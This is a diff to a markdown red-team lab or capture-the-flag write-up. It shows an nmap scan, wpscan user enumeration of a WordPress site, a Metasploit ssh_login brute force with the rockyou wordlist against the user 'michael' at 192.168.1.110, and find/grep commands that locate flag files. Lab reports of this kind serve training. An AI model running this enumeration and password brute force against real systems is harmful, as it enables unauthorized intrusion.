@@ -9,8 +9,8 @@ Nmap scan results for each machine reveal the below services and OS details:
 
 ```
 $ nmap -sV 192.168.1.0/24
-![NMAP scan](images/nmap_scan.png)
 ```
+![nmap scan](images/nmap_scan.png)
 
 This scan identifies the services below as potential points of entry:
 - Target 1
@@ -31,36 +31,62 @@ The following vulnerabilities were identified on each target:
 ### Exploitation
 
 The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
-- Target 1
-  - `flag1`: b9bbcb33ellb80be759c4e844862482d
-    - **Exploit Used**
-      - WPscan to enumerate users on Target 1
-   - Commands:
+
+`flag1`: b9bbcb33ellb80be759c4e844862482d
+
+#### Exploits Used 
+  - WPscan to enumerate users on Target 1
+  - Brute force attacking a weak password
+      
+#### Method
+
+First we enumerated the user accounts by exploiting the vulnerable WordPress site using wpscan.
 ```
-wpscan --url http://192.168.1.110/wordpress -e u
-
+$ wpscan --url http://192.168.1.110/wordpress -e u
+```
+```
+$ msfconsole
+```
+```
+> search ssh_login
+```
+```
+> use 0
+```
+```
+> set rhost 192.168.1.110
+```
+```
+> set username michael
+```
+```
+> set pass_file /usr/share/wordlists/rockyou.txt
+```
+```
+> set stop_on_success true
+```
+```
+> run
+```
+```
+> exit -y
+```
+```
+$ ssh michael@192.168.1.110
+```
+```
+$ grep -rnw / -e “flag1” 2> /dev/null
 ```
 
-`$ msfconsole`
-` > search ssh_login`
-` > use 0`
-` > set rhost 192.168.1.110`
-` > set username michael`
-` > set pass_file /usr/share/wordlists/rockyou.txt`
-` > set stop_on_success true`
-` > run`
+`flag2`: fc3fd58dcdad9ab23faca6e9a3e581c
 
-`> exit -y`
-`$ ssh michael@192.168.1.110`
+#### Exploit Used
+  - Same exploit used to obtain flag 1
 
-`$ grep -rnw / -e “flag1” 2> /dev/null`
-
-
-  - `flag2`: fc3fd58dcdad9ab23faca6e9a3e581c
-    - **Exploit Used**
-      - Same exploit used to obtain flag 1
-   - Commands:
-`$ find / -iname “flag2*” 2> /dev/null`
+#### Method
+```
+$ find / -iname “flag2*” 2> /dev/null
+```
 `cat /var/www/flag2.txt`
 
 
